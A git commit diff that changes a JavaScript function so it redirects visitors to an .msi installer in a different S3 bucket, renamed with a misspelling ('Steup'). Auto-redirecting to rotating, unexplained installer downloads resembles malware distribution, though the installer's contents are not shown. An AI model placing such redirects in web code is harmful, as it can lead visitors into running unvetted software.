c056b4c2f655cfd10c18174e3a61b61f5fde29af
jacky-er <gf3523875@gmail.com>
2025-06-15 00:00:36 +0800

    Update common.js

--- common.js
+++ common.js
@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://nmsljxl.s3.ap-southeast-2.amazonaws.com/HelloWorld_x64.msi";
+	var url="https://hw302.s3.ap-southeast-2.amazonaws.com/HelloWorld_Steup_53R.msi";
 	window.location=url;
 }
